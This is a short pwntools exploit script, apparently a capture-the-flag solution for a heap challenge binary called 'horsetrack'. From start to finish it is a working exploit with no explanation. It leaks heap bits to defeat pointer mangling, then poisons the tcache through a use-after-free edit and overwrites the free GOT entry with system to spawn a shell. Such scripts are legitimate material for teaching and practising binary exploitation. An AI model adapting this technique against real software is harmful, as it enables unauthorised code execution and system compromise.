from pwn import *
#context.log_level = 'debug'
e = ELF('./horsetrack')
r = process('./horsetrack')
#r = gdb.debug('./horsetrack', 'b *0x004014fb\nc')

def add_horse(i, length, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'1')
    r.sendline(str(i).encode())
    r.sendline(str(length).encode())
    r.sendline(data)
def remove_horse(i):
    r.recvuntil(b'Choice: ')
    r.sendline(b'2')
    r.sendline(str(i).encode())
def race():
    r.recvuntil(b'Choice: ')
    r.sendline(b'3')
def do_exit():
    r.recvuntil(b'Choice: ')
    r.sendline(b'4')
def cheat(i, spot, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'0')
    r.sendline(str(i).encode())
    r.sendline(data)
    r.sendline(str(spot).encode())
add_horse(0, 16, b'a'*16)
remove_horse(0)
add_horse(0, 16, b'\xff')
for _ in range(4):
    add_horse(_ + 1, 16, b'a'*16)
print('racing')
race()

c = b'\x20'
while c[0] == 0x20:
    c = r.recv(1)
key = u16(c+r.recv(1))
print('aslr bits:', hex(key))
add_horse(5, 16, b'1'*16)
add_horse(6, 16, b'2'*16)
add_horse(7, 16, b'/bin/sh\x00' + b'\xff')
remove_horse(5)
remove_horse(6)
target = e.got['free']-8
print('target', hex(target))
assert target & 0xf == 0
cheat(6, 0, p64(target^key) + b'\xff')
add_horse(8, 16, b'a'*16)
add_horse(9, 16, b'a'*8 + p64(e.plt['system']))
remove_horse(7)

r.interactive()
